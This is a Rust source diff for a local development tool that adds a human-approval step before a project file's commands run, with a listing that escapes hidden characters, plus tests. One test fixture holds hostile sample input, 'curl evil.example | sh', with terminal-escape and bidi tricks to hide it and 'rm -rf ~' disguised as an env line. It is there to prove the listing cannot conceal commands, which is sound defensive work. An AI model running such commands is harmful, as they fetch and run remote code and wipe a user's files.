@@ -1,19 +1,21 @@
 //! `lokal up [SUB]...` and `lokal down` (SPEC §4.11).
 //!
-//! `up` finds and checks the repo's `lokal.toml`, then routes every service
-//! in it with one locked state write and one reload that waits until every
-//! name is ready (§4.5), so every URL works before any command would
-//! start. `down` removes the services `up` added. Services added by hand
-//! (or by `lokal run`) are never touched: only those marked
-//! `managed = "lokal.toml"` (§5.2).
+//! `up` finds and checks the repo's `lokal.toml`, asks a person to approve
+//! its commands (§16.11), then routes every service in it with one locked
+//! state write and one reload that waits until every name is ready (§4.5),
+//! so every URL works before any command would start. `down` removes the
+//! services `up` added. Services added by hand (or by `lokal run`) are
+//! never touched: only those marked `managed = "lokal.toml"` (§5.2).
 //!
 //! The file starts in this order:
 //! - pure planning, unit-tested without a daemon: [`select_starts`] (which
 //!   services this `up` starts), [`plan`] (checks and ports, changes
 //!   nothing), [`apply_plan`] (the state change) and [`remove_managed`]
 //!   (`down`'s state change);
-//! - then the commands, [`up`] and [`down`]: read the file, take the state
-//!   lock, reload the daemon and print.
+//! - the trust check's pure parts: [`trust_step`] (what to do) and
+//!   [`listing`] (what a person reviews);
+//! - then the commands, [`up`] and [`down`]: read the file, run the trust
+//!   check, take the state lock, reload the daemon and print.
 
 use std::collections::{BTreeMap, BTreeSet};
 use std::path::{Path, PathBuf};
@@ -27,7 +29,7 @@ use crate::error::UserError;
 use crate::paths::{PROJECT_FILE, Paths};
 use crate::project_file::{self, ProjectFile};
 use crate::state::{self, MANAGED_BY_FILE, Project, Service, State, validate};
-use crate::{net, platform, runner, util};
+use crate::{approval, net, platform, runner, util};
 
 /// The busy-port probe: a TCP connect, as `lokal run` does (§4.10).
 const PROBE_TIMEOUT: Duration = Duration::from_millis(50);
@@ -35,6 +37,8 @@ const PROBE_TIMEOUT: Duration = Duration::from_millis(50);
 pub struct UpOpts {
     /// The services to start; empty means all of them.
     pub subs: Vec<String>,
+    /// `--yes`: run the commands without asking, and record no approval.
+    pub yes: bool,
 }
 
 pub struct DownOpts {
@@ -353,6 +357,185 @@ fn clash_error(project: &str, clashes: &[&str]) -> UserError {
     UserError::usage(msg).hint(hint)
 }
 
+// ───────────────────────────── the trust check ─────────────────────────────
+
+/// What the trust check does (SPEC §4.11, §16.11).
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+pub(crate) enum TrustStep {
+    /// A person approved these exact bytes: continue, printing nothing.
+    Approved,
+    /// `--yes`: print the listing and a note, continue, and record nothing.
+    Yes,
+    /// On a terminal: print the listing and ask. Only a `y` records an
+    /// approval.
+    Ask,
+    /// No terminal and no `--yes`: print the listing and exit 1, changing
+    /// nothing.
+    Refuse {
+        /// An approval exists, for other bytes.
+        changed: bool,
+    },
+}
+
+/// Decides the trust check from `--yes`, the stored approval and whether
+/// stdin is a terminal. `--yes` always shows what it runs, approved or not.
+pub(crate) fn trust_step(yes: bool, status: approval::Status, tty: bool) -> TrustStep {
+    use approval::Status;
+    if yes {
+        return TrustStep::Yes;
+    }
+    match (status, tty) {
+        (Status::Approved, _) => TrustStep::Approved,
+        (_, true) => TrustStep::Ask,
+        (status, false) => TrustStep::Refuse {
+            changed: status == Status::Changed,
+        },
+    }
+}
+
+/// The command column of [`listing`] is at most this wide before `in <cwd>`.
+const RUN_COLUMN: usize = 40;
+
+/// What a `lokal.toml` runs, for a person to review (SPEC §4.11): every
+/// service's `run` as written (`{port}` included, because no port is
+/// chosen yet), its `cwd` when that isn't the file's directory, and each
+/// `env` pair on its own line.
+///
+/// Nothing in the file can hide a command from the reader: control and
+/// invisible characters are shown escaped ([`printable`]), so a `\r` or an
+/// escape sequence can't make the terminal draw something else over it,
+/// and every line after a line break in a value starts with `↳`, so a
+/// second command can't pass for an `env` line.
+pub(crate) fn listing(f: &ProjectFile) -> String {
+    let name_w = f
+        .services
+        .keys()
+        .map(|s| s.chars().count())
+        .max()
+        .unwrap_or(0)
+        + 2;
+    let indent = " ".repeat(name_w);
+    let runs: Vec<Vec<String>> = f.services.values().map(|s| shown_lines(&s.run)).collect();
+    let run_w = runs
+        .iter()
+        .map(|l| l[0].chars().count())
+        .max()
+        .unwrap_or(0)
+        .min(RUN_COLUMN);
+    let mut out = format!(
+        "{} runs these commands:\n",
+        printable(&f.canonical.display().to_string())
+    );
+    for ((sub, svc), run) in f.services.iter().zip(&runs) {
+        let first = &run[0];
+        if svc.cwd == f.dir {
+            out.push_str(&format!("  {sub:<name_w$}{first}\n"));
+        } else {
+            // Relative to the file's directory, as in the file (without a
+            // leading `./`); a cwd outside it, `..` included, as written.
+            let cwd = svc.cwd.strip_prefix(&f.dir).unwrap_or(&svc.cwd);
+            let cwd = printable(&cwd.display().to_string());
+            out.push_str(&format!("  {sub:<name_w$}{first:<run_w$}  in {cwd}\n"));
+        }
+        for more in &run[1..] {
+            out.push_str(&format!("  {indent}↳ {more}\n"));
+        }
+        for (k, v) in &svc.env {
+            let v = shown_lines(v);
+            out.push_str(&format!("  {indent}env {}={}\n", printable(k), v[0]));
+            for more in &v[1..] {
+                out.push_str(&format!("  {indent}↳ {more}\n"));
+            }
+        }
+    }
+    out
+}
+
+/// A value's lines, each [`printable`]: never empty, and a final line
+/// break (which runs nothing) doesn't make an empty line.
+fn shown_lines(s: &str) -> Vec<String> {
+    let s = s.strip_suffix('\n').unwrap_or(s);
+    s.split('\n').map(printable).collect()
+}
+
+/// `s` with every character a terminal wouldn't show as itself escaped:
+/// `\n`, `\r` and `\t`, and every other control character and invisible
+/// format character (bidi overrides, zero-width spaces) as `\u{…}`.
+pub(crate) fn printable(s: &str) -> String {
+    let mut out = String::with_capacity(s.len());
+    for c in s.chars() {
+        match c {
+            '\n' => out.push_str("\\n"),
+            '\r' => out.push_str("\\r"),
+            '\t' => out.push_str("\\t"),
+            c if c.is_control() || invisible(c) => {
+                out.push_str(&format!("\\u{{{:x}}}", u32::from(c)));
+            }
+            c => out.push(c),
+        }
+    }
+    out
+}
+
+/// Format characters that draw nothing, or reorder or hide what follows.
+fn invisible(c: char) -> bool {
+    matches!(
+        c,
+        '\u{ad}'
+            | '\u{61c}'
+            | '\u{180e}'
+            | '\u{200b}'..='\u{200f}'
+            | '\u{2028}'..='\u{202e}'
+            | '\u{2060}'..='\u{206f}'
+            | '\u{feff}'
+            | '\u{fff9}'..='\u{fffb}'
+    )
+}
+
+/// The trust check (SPEC §4.11 step 2, §16.11). Returns false when a person
+/// said no; with no terminal and no `--yes` it fails. Either way nothing
+/// has changed.
+fn trust_check(paths: &Paths, f: &ProjectFile, yes: bool) -> Result<bool> {
+    let status = approval::status(paths, &f.canonical, &f.digest);
+    match trust_step(yes, status, util::stdin_is_tty()) {
+        TrustStep::Approved => Ok(true),
+        TrustStep::Yes => {
+            print!("{}", listing(f));
+            out::note("running these without asking (--yes); nothing is remembered");
+            Ok(true)
+        }
+        TrustStep::Ask => {
+            print!("{}", listing(f));
+            if !out::confirm("run these commands?", false)? {
+                println!("Not approved; nothing was started.");
+                return Ok(false);
+            }
+            approval::record(paths, &f.canonical, &f.digest)?;
+            Ok(true)
+        }
+        TrustStep::Refuse { changed } => {
+            print!("{}", listing(f));
+            bail!(refusal(f, changed))
+        }
+    }
+}
+
+/// No terminal and no `--yes`. The hint sends a person to the file and a
+/// terminal, and never offers `--yes`: an agent reading it would just add
+/// the flag (SPEC §16.11).
+fn refusal(f: &ProjectFile, changed: bool) -> UserError {
+    let what = if changed {
+        "changed since it was approved"
+    } else {
+        "has commands nobody has approved yet"
+    };
+    UserError::runtime(format!(
+        "{PROJECT_FILE} {what}: {}",
+        printable(&f.canonical.display().to_string())
+    ))
+    .hint("a person should review the file, then run 'lokal up' in a terminal and answer y")
+}
+
 // ───────────────────────────── commands ─────────────────────────────
 
 fn no_file_error(cwd: &Path) -> UserError {
@@ -387,10 +570,11 @@ pub fn up(o: UpOpts) -> Result<i32> {
         out::note(&project_file::derived_note(&f.project));
     }
     let starts = select_starts(&f, &o.subs)?;
-
-    // The trust check (SPEC §4.11 step 2, §16.11) goes here: after the file
-    // is checked, before anything changes, so a refusal routes nothing.
-
+    // After the file is checked, before anything changes, so a refusal
+    // routes nothing and starts nothing.
+    if !trust_check(&paths, &f, o.yes)? {
+        return Ok(1);
+    }
     let listening = |port: u16| net::probe_tcp("localhost", port, PROBE_TIMEOUT);
     let mut pick = |taken: &BTreeSet<u16>| net::pick_port(taken);
     let outcome = State::update(&paths, |st| {
@@ -561,6 +745,8 @@ mod tests {
         let apex = domain.map_or_else(|| format!("{project}.lokal"), str::to_string);
         ProjectFile {
             path: PathBuf::from("/r/lokal.toml"),
+            canonical: PathBuf::from("/r/lokal.toml"),
+            digest: "0".repeat(64),
             dir: PathBuf::from("/r"),
             project: project.into(),
             project_derived: false,
@@ -906,6 +1092,124 @@ mod tests {
         assert_eq!(e.message, "no service `docs` in /r/lokal.toml");
         assert_eq!(e.hint.as_deref(), Some("its services: @, api, web"));
         assert!(select_starts(&f, &["-x".into()]).is_err());
+    }
+
+    #[test]
+    fn the_trust_step_needs_a_persons_yes_or_the_flag() {
+        use approval::Status::{Approved, Changed, Unapproved};
+        for tty in [false, true] {
+            // --yes never asks, and always shows what it runs.
+            for st in [Approved, Changed, Unapproved] {
+                assert_eq!(trust_step(true, st, tty), TrustStep::Yes);
+            }
+            assert_eq!(trust_step(false, Approved, tty), TrustStep::Approved);
+        }
+        assert_eq!(trust_step(false, Unapproved, true), TrustStep::Ask);
+        assert_eq!(trust_step(false, Changed, true), TrustStep::Ask);
+        assert_eq!(
+            trust_step(false, Unapproved, false),
+            TrustStep::Refuse { changed: false }
+        );
+        assert_eq!(
+            trust_step(false, Changed, false),
+            TrustStep::Refuse { changed: true }
+        );
+    }
+
+    #[test]
+    fn the_listing_shows_every_command_as_written() {
+        // The SPEC §4.11 example, with an env pair.
+        let mut f = file(
+            "shop",
+            None,
+            &[
+                ("@", Some(3000)),
+                ("api", None),
+                ("web", None),
+                ("docs", None),
+            ],
+        );
+        let svc = |f: &mut ProjectFile, sub: &str, run: &str| {
+            let s = f.services.get_mut(sub).unwrap();
+            s.run = run.into();
+        };
+        svc(&mut f, "@", "npm start");
+        svc(&mut f, "api", "cargo run -p api");
+        svc(&mut f, "web", "vite --port {port}");
+        svc(&mut f, "docs", "mkdocs serve -a 127.0.0.1:{port}");
+        f.services.get_mut("api").unwrap().cwd = PathBuf::from("/r/services/api");
+        f.services.get_mut("web").unwrap().env = vec![
+            ("NODE_ENV".into(), "development".into()),
+            ("EMPTY".into(), String::new()),
+        ];
+        assert_eq!(
+            listing(&f),
+            format!(
+                "/r/lokal.toml runs these commands:\n\
+                 \x20 @     npm start\n\
+                 \x20 api   {:<32}  in services/api\n\
+                 \x20 docs  mkdocs serve -a 127.0.0.1:{{port}}\n\
+                 \x20 web   vite --port {{port}}\n\
+                 \x20       env NODE_ENV=development\n\
+                 \x20       env EMPTY=\n",
+                "cargo run -p api"
+            )
+        );
+        // A cwd outside the file's directory is shown as it is; a long
+        // command doesn't push `in` past the column.
+        let mut f = file("shop", None, &[("a", None), ("b", None)]);
+        f.services.get_mut("a").unwrap().cwd = PathBuf::from("/r/../other");
+        f.services.get_mut("b").unwrap().cwd = PathBuf::from("/elsewhere");
+        f.services.get_mut("b").unwrap().run = "x".repeat(50);
+        let l = listing(&f);
+        assert!(
+            l.contains(&format!("  a  {:<40}  in ../other\n", "run a {port}")),
+            "{l}"
+        );
+        assert!(
+            l.contains(&format!("  b  {}  in /elsewhere\n", "x".repeat(50))),
+            "{l}"
+        );
+    }
+
+    /// A file can't make the listing show something other than what runs:
+    /// no control character reaches the terminal, and a second line can't
+    /// pass for an `env` line.
+    #[test]
+    fn the_listing_cant_hide_a_command() {
+        let mut f = file("shop", None, &[("api", None)]);
+        let api = f.services.get_mut("api").unwrap();
+        api.run = "curl evil.example | sh\r\x1b[2Knpm start\u{202e}x\nenv X=1 rm -rf ~\n".into();
+        api.env = vec![("A\x1b".into(), "1\n2".into())];
+        let l = listing(&f);
+        assert_eq!(
+            l,
+            "/r/lokal.toml runs these commands:\n\
+             \x20 api  curl evil.example | sh\\r\\u{1b}[2Knpm start\\u{202e}x\n\
+             \x20      ↳ env X=1 rm -rf ~\n\
+             \x20      env A\\u{1b}=1\n\
+             \x20      ↳ 2\n"
+        );
+        assert!(!l.chars().any(|c| c.is_control() && c != '\n'), "{l:?}");
+    }
+
+    #[test]
+    fn printable_escapes_what_a_terminal_wouldnt_show() {
+        assert_eq!(
+            printable("npm start ü → ✓ {port}"),
+            "npm start ü → ✓ {port}"
+        );
+        assert_eq!(printable("a\tb\nc\rd"), "a\\tb\\nc\\rd");
+        assert_eq!(
+            printable("\x1b\x07\u{7f}\u{85}\u{9b}"),
+            "\\u{1b}\\u{7}\\u{7f}\\u{85}\\u{9b}"
+        );
+        assert_eq!(
+            printable("a\u{200b}b\u{202e}c\u{2066}d\u{feff}e\u{ad}f\u{2028}g"),
+            "a\\u{200b}b\\u{202e}c\\u{2066}d\\u{feff}e\\u{ad}f\\u{2028}g"
+        );
+        // A backslash is shown as it is.
+        assert_eq!(printable(r"grep 'a\|b'"), r"grep 'a\|b'");
     }
 
     #[test]
